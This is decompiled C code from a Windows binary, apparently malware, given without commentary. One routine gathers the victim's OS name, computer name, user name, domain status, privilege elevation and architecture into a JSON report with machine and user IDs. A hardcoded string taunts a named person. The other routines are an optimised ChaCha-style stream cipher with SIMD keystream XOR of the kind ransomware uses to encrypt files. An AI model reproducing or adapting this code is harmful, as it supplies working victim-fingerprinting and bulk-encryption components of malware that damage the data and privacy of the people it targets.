  memset(v12, 0, 0x80u);
  memset(v13, 0, 0x80u);
  memset(v11, 0, 0x80u);
  v20 = sub_401380();
  sub_401550(v14);
  v24 = 1;
  i = 256;
  if ( !RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, 0x101u, (PHKEY)v25) )
  {
    RegQueryValueExW((HKEY)v25[0], L"ProductName", 0, (LPDWORD)&v24, v11, &i);
    RegCloseKey((HKEY)v25[0]);
  }
  GetComputerNameW(v12, &v18);
  GetUserNameW(v13, &v17);
  JoinInformation = NetGetJoinInformation(0, &v22, &v16);
  v24 = 11;
  CurrentProcess = GetCurrentProcess();
  if ( OpenProcessToken(CurrentProcess, 8u, v25) )
  {
    GetTokenInformation(v25[0], TokenElevationType, &v24, 4u, &v19);
    CloseHandle(v25[0]);
  }
  v25[0] = 0;
  ModuleHandleW = GetModuleHandleW(L"kernel32");
  IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleW, "IsWow64Process");
  if ( IsWow64Process )
  {
    v4 = GetCurrentProcess();
    IsWow64Process(v4, (PBOOL)v25);
  }
  strcpy(v15, "Chuong Dong looks like hot dog!!");
  v19 = (DWORD)v25[0];
  v5 = (int *)HeapAlloc(hHeap, 8u, 0x8000u);
  for ( i = (DWORD)v5; !v5; i = (DWORD)v5 )
  {
    Sleep(0x64u);
    v5 = (int *)HeapAlloc(hHeap, 8u, 0x8000u);
  }
  v24 = sub_401240(
          v5,
          (int)"{\"mid\": \"%s\",\"uid\": \"%s\",\"ver\": \"%S\",\"os\": \"%S\",\"computer\": \"%S\",\"username\": \"%S\""
               ",\"domain\": \"%S\", \"arch\": \"%S\",\"elevation\": \"%lu\", %S}",
          (int)v14);
  sub_401280((int)v5, (int)v5, v24);
  JoinInformation = 4 * v24;
  v6 = (CHAR *)HeapAlloc(hHeap, 8u, 4 * v24);
  if ( !v6 )
  {
    v7 = JoinInformation;
    do
    {
      Sleep(0x64u);
      v6 = (CHAR *)HeapAlloc(hHeap, 8u, v7);
    }
    while ( !v6 );
    v5 = (int *)i;
  }
  sub_4010D0((int)v5, v6, v24);
  v8 = lstrlenA(v6);
  sub_4016B0(v9, v6, v8);
  if ( v20 )
    HeapFree(hHeap, 0, v20);
  if ( v22 )
    NetApiBufferFree(v22);
  if ( v5 )
    HeapFree(hHeap, 0, v5);
  return HeapFree(hHeap, 0, v6);
}
// 401760: could not find valid save-restore pair for ebp
// 401A64: conditional instruction was optimized away because esi.4!=0
// 401A19: variable 'v9' is possibly undefined

//----- (00401A80) --------------------------------------------------------
unsigned int __fastcall sub_401A80(int a1, int *a2)
{
  int v2; // eax
  int v3; // ecx
  int v4; // esi
  int v5; // edx
  int v6; // edi
  int v7; // edi
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // ecx
  int v12; // edx
  int v13; // edx
  int v14; // ebx
  int v15; // eax
  int v16; // edx
  int v17; // edx
  int v18; // eax
  int v19; // esi
  int v20; // eax
  int v21; // eax
  int v22; // edi
  int v23; // edi
  int v24; // eax
  int v25; // edi
  int v26; // eax
  int v27; // edx
  int v28; // ecx
  int v29; // eax
  int v30; // ecx
  int v31; // edx
  int v32; // eax
  int v33; // eax
  int v34; // eax
  int v35; // ebx
  int v36; // eax
  bool v37; // zf
  unsigned int result; // eax
  int v40; // [esp+10h] [ebp-80h]
  int v41; // [esp+14h] [ebp-7Ch]
  int v42; // [esp+18h] [ebp-78h]
  int v43; // [esp+1Ch] [ebp-74h]
  int v44; // [esp+20h] [ebp-70h]
  int v45; // [esp+24h] [ebp-6Ch]
  int v46; // [esp+28h] [ebp-68h]
  int v47; // [esp+2Ch] [ebp-64h]
  int v48; // [esp+30h] [ebp-60h]
  int v49; // [esp+34h] [ebp-5Ch]
  int v50; // [esp+38h] [ebp-58h]
  int v51; // [esp+3Ch] [ebp-54h]
  int v52; // [esp+40h] [ebp-50h]
  int v53; // [esp+44h] [ebp-4Ch]
  int v54; // [esp+48h] [ebp-48h]
  int v55; // [esp+4Ch] [ebp-44h]
  int v56; // [esp+50h] [ebp-40h]
  int v57; // [esp+50h] [ebp-40h]
  int v58; // [esp+54h] [ebp-3Ch]
  int v59; // [esp+58h] [ebp-38h]
  int v60; // [esp+5Ch] [ebp-34h]
  int v61; // [esp+60h] [ebp-30h]
  int v62; // [esp+64h] [ebp-2Ch]
  int v63; // [esp+68h] [ebp-28h]
  int v64; // [esp+68h] [ebp-28h]
  int v65; // [esp+6Ch] [ebp-24h]
  int v66; // [esp+6Ch] [ebp-24h]
  int v67; // [esp+70h] [ebp-20h]
  int v68; // [esp+70h] [ebp-20h]
  int v69; // [esp+70h] [ebp-20h]
  int v70; // [esp+74h] [ebp-1Ch]
  int v71; // [esp+74h] [ebp-1Ch]
  int v72; // [esp+74h] [ebp-1Ch]
  int v73; // [esp+74h] [ebp-1Ch]
  int v74; // [esp+78h] [ebp-18h]
  int v75; // [esp+78h] [ebp-18h]
  int v76; // [esp+78h] [ebp-18h]
  int v77; // [esp+78h] [ebp-18h]
  int v78; // [esp+7Ch] [ebp-14h]
  int v79; // [esp+7Ch] [ebp-14h]
  int v80; // [esp+7Ch] [ebp-14h]
  int v81; // [esp+7Ch] [ebp-14h]
  unsigned int v82; // [esp+7Ch] [ebp-14h]
  int v83; // [esp+80h] [ebp-10h]
  int v84; // [esp+80h] [ebp-10h]
  int v85; // [esp+80h] [ebp-10h]
  int v86; // [esp+84h] [ebp-Ch]
  int v87; // [esp+84h] [ebp-Ch]
  int v88; // [esp+84h] [ebp-Ch]
  int v89; // [esp+84h] [ebp-Ch]
  int v90; // [esp+88h] [ebp-8h]
  int v91; // [esp+88h] [ebp-8h]
  int v92; // [esp+88h] [ebp-8h]
  int v93; // [esp+88h] [ebp-8h]
  int v94; // [esp+8Ch] [ebp-4h]
  int v95; // [esp+8Ch] [ebp-4h]
  int v96; // [esp+8Ch] [ebp-4h]
  int v97; // [esp+8Ch] [ebp-4h]

  v43 = *a2;
  v83 = *a2;
  v54 = a2[1];
  v53 = a2[2];
  v52 = a2[3];
  v65 = v52;
  v51 = a2[4];
  v62 = v51;
  v50 = a2[5];
  v59 = v50;
  v46 = a2[9];
  v86 = v46;
  v49 = a2[6];
  v61 = v49;
  v45 = a2[10];
  v94 = v45;
  v48 = a2[7];
  v60 = v48;
  v2 = a2[8];
  v44 = a2[11];
  v90 = v44;
  v3 = a2[12];
  v42 = a2[13];
  v67 = v54;
  v4 = a2[14];
  v40 = a2[15];
  v5 = v42;
  v78 = v40;
  v6 = v53;
  v47 = v2;
  v56 = v3;
  v41 = v4;
  v70 = v4;
  v55 = 4;
  while ( 1 )
  {
    v7 = v61 + v6;
    v8 = __ROL4__((v62 + v83) ^ v3, 16);
    v74 = v8 + v2;
    v9 = __ROL4__(v62 ^ (v8 + v2), 12);
    v10 = (v9 + v62 + v83) ^ v8;
    v84 = v9 + v62 + v83;
    v11 = __ROL4__(v10, 8);
    v75 = v11 + v74;
    v12 = (v59 + v67) ^ v5;
    v68 = v59 + v67;
    v13 = __ROL4__(v12, 16);
    v14 = __ROL4__(v9 ^ v75, 7);
    v87 = v13 + v86;
    v15 = __ROL4__(v59 ^ v87, 12);
    v16 = (v15 + v68) ^ v13;
    v69 = v15 + v68;
    v58 = __ROL4__(v16, 8);
    v88 = v58 + v87;
    v17 = __ROL4__(v15 ^ v88, 7);
    v71 = __ROL4__(v7 ^ v70, 16);
    v95 = v71 + v94;
    v18 = __ROL4__(v61 ^ v95, 12);
    v63 = v18 + v7;
    v72 = __ROL4__((v18 + v7) ^ v71, 8);
    v96 = v72 + v95;
    v19 = __ROL4__(v18 ^ v96, 7);
    v20 = __ROL4__((v60 + v65) ^ v78, 16);
    v91 = v20 + v90;
    v79 = v20;
    v21 = __ROL4__(v60 ^ v91, 12);
    v66 = v21 + v60 + v65;
    v22 = __ROL4__(v66 ^ v79, 8);
    v92 = v22 + v91;
    v80 = v22;
    v23 = v21 ^ v92;
    v85 = v17 + v84;
    v24 = __ROL4__(v85 ^ v80, 16);
    v97 = v24 + v96;
    v81 = v24;
    v25 = __ROL4__(v23, 7);
    v26 = __ROL4__(v17 ^ v97, 12);
    v83 = v26 + v85;
    v27 = __ROL4__(v83 ^ v81, 8);
    v94 = v27 + v97;
    v78 = v27;
    v59 = __ROL4__(v26 ^ v94, 7);
    v28 = __ROL4__((v19 + v69) ^ v11, 16);
    v93 = v28 + v92;
    v29 = __ROL4__(v19 ^ v93, 12);
    v30 = (v29 + v19 + v69) ^ v28;
    v67 = v29 + v19 + v69;
    v3 = __ROL4__(v30, 8);
    v90 = v3 + v93;
    v64 = v25 + v63;
    v61 = __ROL4__(v29 ^ v90, 7);
    v31 = __ROL4__(v64 ^ v58, 16);
    v76 = v31 + v75;
    v32 = __ROL4__(v25 ^ v76, 12);
    v6 = v32 + v64;
    v5 = __ROL4__((v32 + v64) ^ v31, 8);
    v77 = v5 + v76;
    v60 = __ROL4__(v32 ^ v77, 7);
    v33 = __ROL4__((v14 + v66) ^ v72, 16);
    v89 = v33 + v88;
    v73 = v33;
    v34 = __ROL4__(v14 ^ v89, 12);
    v65 = v34 + v14 + v66;
    v35 = __ROL4__(v65 ^ v73, 8);
    v70 = v35;
    v86 = v35 + v89;
    v36 = __ROL4__(v34 ^ v86, 7);
    v37 = v55-- == 1;
    v62 = v36;
    if ( v37 )
      break;
    v2 = v77;
  }
  v57 = v56 + v3;
  *(_BYTE *)(a1 + 1) = (unsigned __int16)(v43 + v83) >> 8;
  *(_BYTE *)(a1 + 2) = (unsigned int)(v43 + v83) >> 16;
  *(_BYTE *)a1 = v43 + v83;
  *(_BYTE *)(a1 + 3) = (unsigned int)(v43 + v83) >> 24;
  *(_WORD *)(a1 + 4) = v54 + v67;
  *(_BYTE *)(a1 + 6) = (unsigned int)(v54 + v67) >> 16;
  *(_BYTE *)(a1 + 7) = (unsigned int)(v54 + v67) >> 24;
  *(_WORD *)(a1 + 8) = v53 + v6;
  *(_BYTE *)(a1 + 10) = (unsigned int)(v53 + v6) >> 16;
  *(_BYTE *)(a1 + 11) = (unsigned int)(v53 + v6) >> 24;
  *(_DWORD *)(a1 + 12) = v52 + v65;
  v82 = v40 + v78;
  *(_DWORD *)(a1 + 16) = v51 + v36;
  *(_BYTE *)(a1 + 21) = (unsigned __int16)(v50 + v59) >> 8;
  *(_BYTE *)(a1 + 22) = (unsigned int)(v50 + v59) >> 16;
  *(_BYTE *)(a1 + 20) = v50 + v59;
  *(_BYTE *)(a1 + 23) = (unsigned int)(v50 + v59) >> 24;
  *(_BYTE *)(a1 + 25) = (unsigned __int16)(v49 + v61) >> 8;
  *(_BYTE *)(a1 + 26) = (unsigned int)(v49 + v61) >> 16;
  *(_BYTE *)(a1 + 24) = v49 + v61;
  *(_BYTE *)(a1 + 27) = (unsigned int)(v49 + v61) >> 24;
  *(_BYTE *)(a1 + 29) = (unsigned __int16)(v48 + v60) >> 8;
  *(_BYTE *)(a1 + 30) = (unsigned int)(v48 + v60) >> 16;
  *(_BYTE *)(a1 + 28) = v48 + v60;
  *(_BYTE *)(a1 + 31) = (unsigned int)(v48 + v60) >> 24;
  *(_BYTE *)(a1 + 33) = (unsigned __int16)(v47 + v77) >> 8;
  *(_BYTE *)(a1 + 34) = (unsigned int)(v47 + v77) >> 16;
  *(_BYTE *)(a1 + 32) = v47 + v77;
  *(_BYTE *)(a1 + 35) = (unsigned int)(v47 + v77) >> 24;
  *(_BYTE *)(a1 + 37) = (unsigned __int16)(v46 + v86) >> 8;
  *(_BYTE *)(a1 + 38) = (unsigned int)(v46 + v86) >> 16;
  *(_BYTE *)(a1 + 36) = v46 + v86;
  *(_BYTE *)(a1 + 39) = (unsigned int)(v46 + v86) >> 24;
  *(_DWORD *)(a1 + 40) = v45 + v94;
  *(_DWORD *)(a1 + 44) = v44 + v90;
  *(_WORD *)(a1 + 48) = v57;
  *(_BYTE *)(a1 + 50) = BYTE2(v57);
  *(_BYTE *)(a1 + 53) = (unsigned __int16)(v42 + v5) >> 8;
  *(_BYTE *)(a1 + 54) = (unsigned int)(v42 + v5) >> 16;
  *(_BYTE *)(a1 + 51) = HIBYTE(v57);
  *(_DWORD *)(a1 + 56) = v41 + v35;
  *(_BYTE *)(a1 + 52) = v42 + v5;
  *(_BYTE *)(a1 + 61) = BYTE1(v82);
  result = HIWORD(v82);
  *(_BYTE *)(a1 + 60) = v82;
  *(_BYTE *)(a1 + 55) = (unsigned int)(v42 + v5) >> 24;
  *(_WORD *)(a1 + 62) = HIWORD(v82);
  return result;
}

//----- (00401F30) --------------------------------------------------------
int __usercall sub_401F30@<eax>(unsigned __int8 *a1@<edx>, _DWORD *a2@<ecx>, unsigned __int8 *a3)
{
  int v4; // ecx
  int v5; // eax
  int result; // eax
  int v7; // ecx

  qmemcpy(a2 + 128, "expand 32-byte k", 16);
  a2[132] = *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);
  a2[133] = a1[4] | ((a1[5] | (*((unsigned __int16 *)a1 + 3) << 8)) << 8);
  a2[134] = a1[8] | ((a1[9] | (*((unsigned __int16 *)a1 + 5) << 8)) << 8);
  a2[135] = a1[12] | ((a1[13] | (*((unsigned __int16 *)a1 + 7) << 8)) << 8);
  a2[136] = a1[16] | ((a1[17] | (*((unsigned __int16 *)a1 + 9) << 8)) << 8);
  a2[137] = a1[20] | ((a1[21] | (*((unsigned __int16 *)a1 + 11) << 8)) << 8);
  a2[138] = a1[24] | ((a1[25] | (*((unsigned __int16 *)a1 + 13) << 8)) << 8);
  v4 = a1[29] | (*((unsigned __int16 *)a1 + 15) << 8);
  v5 = a1[28];
  a2[140] = 0;
  a2[139] = v5 | (v4 << 8);
  a2[141] = 0;
  a2[142] = *a3 | ((a3[1] | (*((unsigned __int16 *)a3 + 1) << 8)) << 8);
  result = a3[4];
  v7 = result | ((a3[5] | (*((unsigned __int16 *)a3 + 3) << 8)) << 8);
  a2[144] = 512;
  a2[143] = v7;
  return result;
}

//----- (00402100) --------------------------------------------------------
void __usercall sub_402100(__m128i *a1@<edx>, __m128i *a2@<ecx>, __m128i *a3, unsigned int a4)
{
  __m128i *v4; // ebx
  bool v6; // cf
  __m128i *v7; // ecx
  unsigned int v8; // edi
  __int8 v9; // al
  int m128i_i32; // ecx
  __m128i *v11; // ecx
  __m128i *v13; // edx
  __m128i *v14; // ecx
  __m128i *v15; // eax
  unsigned int i; // edx
  __int8 *v17; // ecx
  __int8 v18; // al
  __m128i v19; // xmm0
  __m128i v20; // xmm1
  __m128i v21; // xmm0
  __m128i v22; // xmm1
  __m128i v23; // xmm0
  unsigned int v24; // edx
  unsigned int v25; // ecx
  unsigned int v26; // eax
  __m128i *v27; // edi
  __m128i v28; // xmm0
  __m128i v29; // xmm1
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128i v32; // xmm0
  __m128i v33; // xmm1
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  unsigned int v36; // edx
  __int8 *v37; // esi
  __int8 *v38; // ebx
  unsigned int v39; // ecx
  char v40; // al
  unsigned int v41; // edx
  unsigned int v42; // ecx
  __m128i *v43; // ecx
  unsigned int v44; // edi
  __m128i *v45; // eax
  unsigned int v46; // ebx
  __m128i v47; // xmm0
  __m128i v48; // xmm1
  __m128i v49; // xmm0
  __m128i v50; // xmm1
  __m128i v51; // xmm0
  __m128i v52; // xmm1
  __m128i v53; // xmm0
  __m128i *v54; // edx
  __int8 *v55; // esi
  unsigned int v56; // ecx
  unsigned int v57; // ebx
  __int8 v58; // al
  unsigned int v59; // edx
  unsigned int v60; // ecx
  __m128i *v61; // ecx
  unsigned int v62; // edi
  __m128i *v63; // eax
  unsigned int v64; // ebx
  __m128i v65; // xmm0
  __m128i v66; // xmm1
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm0
  __m128i v70; // xmm1
  __m128i v71; // xmm0
  __m128i *v72; // edx
  __int8 *v73; // esi
  unsigned int v74; // ecx
  unsigned int v75; // ebx
  __int8 v76; // al
  unsigned int v77; // [esp+10h] [ebp-20h]
  int v78; // [esp+14h] [ebp-1Ch]
  __int8 *v79; // [esp+18h] [ebp-18h]
  unsigned int v80; // [esp+18h] [ebp-18h]
  unsigned int v81; // [esp+18h] [ebp-18h]
  unsigned int *v82; // [esp+1Ch] [ebp-14h]
  unsigned int v83; // [esp+20h] [ebp-10h]
  unsigned int v84; // [esp+20h] [ebp-10h]
  unsigned int v85; // [esp+20h] [ebp-10h]
  __m128i *v86; // [esp+24h] [ebp-Ch]
  unsigned int v87; // [esp+28h] [ebp-8h]
  unsigned int v88; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v4 = a3;
  v88 = (unsigned int)a1;
  v6 = a2[36].m128i_i32[0] < 0x200u;
  v7 = a2 + 36;
  v8 = a4;
  v82 = (unsigned int *)v7;
  v87 = a4;
  v86 = a3;
  if ( v6 )
  {
    do
    {
      if ( !v8 )
        break;
      v87 = --v8;
      v9 = a1->m128i_i8[0] ^ a2->m128i_i8[v7->m128i_i32[0]];
      a1 = (__m128i *)((char *)a1 + 1);
      v4->m128i_i8[0] = v9;
      v4 = (__m128i *)((char *)v4 + 1);
      ++v7->m128i_i32[0];
      v86 = v4;
      v88 = (unsigned int)a1;
    }
    while ( v7->m128i_i32[0] < 0x200u );
  }
  while ( 1 )
  {
    if ( byte_43083E && (unsigned int)~a2[35].m128i_i32[0] > 8 )
    {
      while ( v8 )
      {
        m128i_i32 = (int)a2[32].m128i_i32;
        if ( v8 < 0x200 )
        {
          sub_402690(0, m128i_i32, (int)&savedregs, (int)a2);
          a2[35].m128i_i32[0] += 8;
          v24 = 0;
          v83 = 0;
          v25 = v88;
          if ( v8 < 0x40 )
            goto LABEL_36;
          v83 = 0;
          if ( (unsigned int)v4 <= v8 + v88 - 1 && (unsigned int)&v4[-1].m128i_u32[3] + v8 + 3 >= v88 )
            goto LABEL_36;
          if ( v4 <= (__m128i *)((char *)&a2[-1].m128i_u64[1] + v8 + 7)
            && (__m128i *)((char *)&v4[-1].m128i_u64[1] + v8 + 7) >= a2 )
          {
            goto LABEL_36;
          }
          v77 = v8 & 0xFFFFFFC0;
          v26 = v88 + 16;
          v79 = &v4->m128i_i8[-v88];
          v27 = v4 + 2;
          v78 = (char *)a2 - (char *)v4;
          do
          {
            v28 = *(__m128i *)(v26 - 16);
            v26 += 64;
            v27 += 4;
            v29 = _mm_xor_si128(a2[v24 / 0x10], v28);
            v30 = *(__m128i *)(v26 - 64);
            v27[-6] = v29;
            v31 = _mm_xor_si128(*(__m128i *)((char *)&a2[-4] + v26 - v88), v30);
            v32 = *(__m128i *)(v26 - 48);
            *(__m128i *)&v79[v26 - 64] = v31;
            v4 = v86;
            v33 = _mm_xor_si128(*(__m128i *)((char *)&v27[-4] + v78), v32);
            v34 = *(__m128i *)(v26 - 32);
            v27[-4] = v33;
            v35 = a2[v24 / 0x10 + 3];
            v24 += 64;
            v27[-3] = _mm_xor_si128(v35, v34);
          }
          while ( v24 < v77 );
          v8 = v87;
          v25 = v88;
          v83 = v24;
          if ( v24 < v87 )
          {
LABEL_36:
            v36 = v25 + v24;
            v37 = &a2->m128i_i8[-v25];
            v38 = &v4->m128i_i8[-v25];
            v39 = v8 - v83;
            do
            {
              v40 = v37[v36++];
              v38[v36 - 1] = *(_BYTE *)(v36 - 1) ^ v40;
              --v39;
            }
            while ( v39 );
          }
          *v82 = v8;
          return;
        }
        sub_402690((int)a1, m128i_i32, (int)&savedregs, (int)v4);
        a2[35].m128i_i32[0] += 8;
        v4 += 32;
        v8 -= 512;
        a1 = (__m128i *)(v88 + 512);
        v86 = v4;
        v88 += 512;
        v87 = v8;
        if ( (unsigned int)~a2[35].m128i_i32[0] <= 8 )
          break;
      }
    }
    if ( byte_43083D && (unsigned int)~a2[35].m128i_i32[0] > 4 )
      break;
LABEL_14:
    if ( !v8 )
      return;
    sub_401A80((int)a2[28].m128i_i32, a2[32].m128i_i32);
    if ( a2[35].m128i_i32[0]++ == -1 )
      ++a2[35].m128i_i32[1];
    if ( v8 <= 0x40 )
    {
      v59 = 0;
      v85 = 0;
      v60 = v88;
      if ( v8 < 0x40 )
        goto LABEL_58;
      v85 = 0;
      if ( (unsigned int)v4 <= v8 + v88 - 1 && (unsigned int)&v4[-1].m128i_u32[3] + v8 + 3 >= v88 )
        goto LABEL_58;
      if ( v4 <= (__m128i *)((char *)&a2[27].m128i_u64[1] + v8 + 7)
        && (__m128i *)((char *)&v4[-1].m128i_u64[1] + v8 + 7) >= &a2[28] )
      {
        goto LABEL_58;
      }
      v81 = v8 & 0x40;
      v61 = a2 + 29;
      v62 = v88 + 48;
      v63 = v4 + 1;
      v59 = 0;
      v64 = v88 - (_DWORD)v4;
      do
      {
        v65 = *(__m128i *)(v62 - 48);
        v59 += 64;
        v61 += 4;
        v62 += 64;
        v63 += 4;
        v66 = _mm_xor_si128(v61[-5], v65);
        v67 = v61[-4];
        v63[-5] = v66;
        v68 = _mm_xor_si128(*(__m128i *)((char *)&v63[-4] + v64), v67);
        v69 = *(__m128i *)(v62 - 80);
        v63[-4] = v68;
        v70 = _mm_xor_si128(v61[-3], v69);
        v71 = *(__m128i *)(v62 - 64);
        v63[-3] = v70;
        v63[-2] = _mm_xor_si128(v61[-2], v71);
      }
      while ( v59 < v81 );
      v8 = v87;
      v4 = v86;
      v60 = v88;
      v85 = v59;
      if ( v59 < v87 )
      {
LABEL_58:
        v72 = &v4[v59 / 0x10];
        v73 = &a2[28].m128i_i8[v85];
        v74 = v60 - (_DWORD)v4;
        v75 = v8 - v85;
        do
        {
          v76 = *v73++ ^ v72->m128i_i8[v74];
          v72 = (__m128i *)((char *)v72 + 1);
          v72[-1].m128i_i8[15] = v76;
          --v75;
        }
        while ( v75 );
      }
      *v82 = v8 + 448;
      return;
    }
    v13 = (__m128i *)v88;
    v14 = (__m128i *)((char *)v4 + 63);
    if ( ((unsigned int)v4 > v88 + 63 || (unsigned int)v14 < v88)
      && ((v15 = a2 + 28, v4 > (__m128i *)((char *)&a2[31].m128i_u64[1] + 7)) || v14 < v15) )
    {
      v19 = *(__m128i *)(v88 + 16);
      *v4 = _mm_xor_si128(*(__m128i *)v88, *v15);
      v20 = _mm_xor_si128(a2[29], v19);
      v21 = *(__m128i *)(v88 + 32);
      v4[1] = v20;
      v22 = _mm_xor_si128(a2[30], v21);
      v23 = *(__m128i *)(v88 + 48);
      v4[2] = v22;
      v4[3] = _mm_xor_si128(a2[31], v23);
    }
    else
    {
      for ( i = 0; i < 0x40; ++i )
      {
        v17 = &v4->m128i_i8[i];
        v18 = a2[28].m128i_i8[i] ^ *(_BYTE *)(v88 + i);
        *v17 = v18;
      }
      v8 = v87;
      v13 = (__m128i *)v88;
    }
    a1 = v13 + 4;
    v4 += 4;
    v8 -= 64;
    v88 = (unsigned int)a1;
    v86 = v4;
    v87 = v8;
    if ( !v8 )
      return;
  }
  while ( v8 )
  {
    v11 = a2 + 32;
    if ( v8 < 0x100 )
    {
      sub_403260(0, v11, a2 + 16);
      a2[35].m128i_i32[0] += 4;
      v41 = 0;
      v84 = 0;
      v42 = v88;
      if ( v8 < 0x40 )
        goto LABEL_47;
      v84 = 0;
      if ( (unsigned int)v4 <= v8 + v88 - 1 && (unsigned int)&v4[-1].m128i_u32[3] + v8 + 3 >= v88 )
        goto LABEL_47;
      if ( v4 <= (__m128i *)((char *)&a2[15].m128i_u64[1] + v8 + 7)
        && (__m128i *)((char *)&v4[-1].m128i_u64[1] + v8 + 7) >= &a2[16] )
      {
        goto LABEL_47;
      }
      v80 = v8 & 0xC0;
      v43 = a2 + 17;
      v44 = v88 + 48;
      v45 = v4 + 1;
      v41 = 0;
      v46 = v88 - (_DWORD)v4;
      do
      {
        v47 = *(__m128i *)(v44 - 48);
        v41 += 64;
        v43 += 4;
        v44 += 64;
        v45 += 4;
        v48 = _mm_xor_si128(v43[-5], v47);
        v49 = v43[-4];
        v45[-5] = v48;
        v50 = _mm_xor_si128(*(__m128i *)((char *)&v45[-4] + v46), v49);
        v51 = *(__m128i *)(v44 - 80);
        v45[-4] = v50;
        v52 = _mm_xor_si128(v43[-3], v51);
        v53 = *(__m128i *)(v44 - 64);
        v45[-3] = v52;
        v45[-2] = _mm_xor_si128(v43[-2], v53);
      }
      while ( v41 < v80 );
      v8 = v87;
      v4 = v86;
      v42 = v88;
      v84 = v41;
      if ( v41 < v87 )
      {
LABEL_47:
        v54 = &v4[v41 / 0x10];
        v55 = &a2[16].m128i_i8[v84];
        v56 = v42 - (_DWORD)v4;
        v57 = v8 - v84;
        do
        {
          v58 = *v55++ ^ v54->m128i_i8[v56];
          v54 = (__m128i *)((char *)v54 + 1);
          v54[-1].m128i_i8[15] = v58;
          --v57;
        }
        while ( v57 );
      }
      *v82 = v8 + 256;
      return;
    }
    sub_403260(a1, v11, v4);
    a2[35].m128i_i32[0] += 4;
    v4 += 16;
    v8 -= 256;
    a1 = (__m128i *)(v88 + 256);
    v86 = v4;
    v88 += 256;
    v87 = v8;
    if ( (unsigned int)~a2[35].m128i_i32[0] <= 4 )
      goto LABEL_14;
  }
}
// 40233B: conditional instruction was optimized away because edi.4 is in (1..1FF)
// 402460: conditional instruction was optimized away because edi.4 is in (1..FF)
// 402574: conditional instruction was optimized away because edi.4 is in (1..40)
// 4024AE: mask 0xFFFFFFC0 is shortened because edi.4 <= 0xFF
// 4025CB: mask 0xFFFFFFC0 is shortened because edi.4 <= 0x40
// 43083D: using guessed type char byte_43083D;
// 43083E: using guessed type char byte_43083E;

//----- (00402690) --------------------------------------------------------
__int64 __usercall sub_402690@<edx:eax>(int a1@<edx>, int _ECX@<ecx>, int a3@<ebp>, int a4)
{
  unsigned int v10; // esi
  __int64 result; // rax
  int v38; // ecx
  _DWORD v308[3]; // [esp+0h] [ebp-Ch] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v308[0] = a3;
  v308[1] = retaddr;
  _EBP = v308;
  __asm
  {
    vbroadcasti128 ymm4, xmmword ptr [ecx+20h]
    vbroadcasti128 ymm2, xmmword ptr [ecx]
    vbroadcasti128 ymm3, xmmword ptr [ecx+10h]
    vbroadcasti128 ymm5, xmmword ptr [ecx+30h]
    vmovdqa xmm0, ds:xmmword_42BCB0
  }
  v10 = ~*(_DWORD *)(_ECX + 48);
  LODWORD(result) = a4;
  __asm
  {
    vpinsrd xmm1, xmm0, ecx, 1
    vpshufd xmm0, xmm1, 0FFh
    vinsertf128 ymm6, ymm1, xmm0, 1
    vmovdqa xmm0, ds:xmmword_42BCC0
    vpinsrd xmm1, xmm0, edx, 1
    vmovdqa xmm0, ds:xmmword_42BC80
    vpinsrd xmm0, xmm0, ecx, 1
    vinsertf128 ymm7, ymm1, xmm0, 1
    vmovdqa xmm0, ds:xmmword_42BCD0
    vpinsrd xmm1, xmm0, edx, 1
    vmovdqa xmm0, ds:xmmword_42BC90
    vpinsrd xmm0, xmm0, ecx, 1
    vinsertf128 ymm0, ymm1, xmm0, 1
    vmovdqu ymmword ptr [ebp-280h], ymm0
    vmovdqa xmm0, ds:xmmword_42BCE0
  }
  HIDWORD(result) = v10 < 7;
  __asm
  {
    vpinsrd xmm1, xmm0, edx, 1
    vmovdqa xmm0, ds:xmmword_42BCA0
    vpinsrd xmm0, xmm0, ecx, 1
    vinsertf128 ymm1, ymm1, xmm0, 1
    vpaddd  ymm0, ymm6, ymm5
    vmovdqu ymmword ptr [ebp-0A0h], ymm0
    vpaddd  ymm0, ymm7, ymm5
    vmovdqu ymmword ptr [ebp-180h], ymm0
    vpaddd  ymm0, ymm5, ymmword ptr [ebp-280h]
    vmovdqu ymmword ptr [ebp-320h], ymm6
    vmovdqu ymmword ptr [ebp-340h], ymm7
    vmovdqu ymmword ptr [ebp-220h], ymm0
    vmovdqu ymm6, ymm2
    vmovdqu ymm7, ymm2
    vpaddd  ymm0, ymm1, ymm5
    vmovdqu ymmword ptr [ebp-2E0h], ymm4
    vmovdqu ymmword ptr [ebp-120h], ymm4
    vmovdqu ymmword ptr [ebp-140h], ymm4
    vmovdqu ymmword ptr [ebp-200h], ymm4
    vmovdqu ymmword ptr [ebp-1A0h], ymm4
    vmovdqu ymm4, ds:ymmword_42BD00
    vmovdqu ymmword ptr [ebp-2A0h], ymm2
    vmovdqu ymmword ptr [ebp-2C0h], ymm3
    vmovdqu ymmword ptr [ebp-300h], ymm5
    vmovdqu ymmword ptr [ebp-360h], ymm1
    vmovdqu ymmword ptr [ebp-1E0h], ymm2
    vmovdqu ymmword ptr [ebp-100h], ymm3
    vmovdqu ymmword ptr [ebp-60h], ymm6
    vmovdqu ymmword ptr [ebp-20h], ymm3
    vmovdqu ymmword ptr [ebp-80h], ymm7
    vmovdqu ymmword ptr [ebp-0C0h], ymm3
    vmovdqu ymmword ptr [ebp-160h], ymm2
    vmovdqu ymmword ptr [ebp-40h], ymm3
    vmovdqu ymmword ptr [ebp-0E0h], ymm0
  }
  v38 = 4;
  do
  {
    __asm
    {
      vmovdqu ymm5, ymmword ptr [ebp-100h]
      vpaddd  ymm0, ymm5, ymmword ptr [ebp-1E0h]
      vpxor   ymm0, ymm0, ymmword ptr [ebp-0A0h]
      vpaddd  ymm1, ymm6, ymmword ptr [ebp-20h]
      vpshufb ymm6, ymm0, ymm4
      vpxor   ymm0, ymm1, ymmword ptr [ebp-180h]
      vpaddd  ymm2, ymm7, ymmword ptr [ebp-0C0h]
      vpshufb ymm7, ymm0, ymm4
      vpxor   ymm0, ymm2, ymmword ptr [ebp-220h]
      vpaddd  ymm3, ymm3, ymmword ptr [ebp-160h]
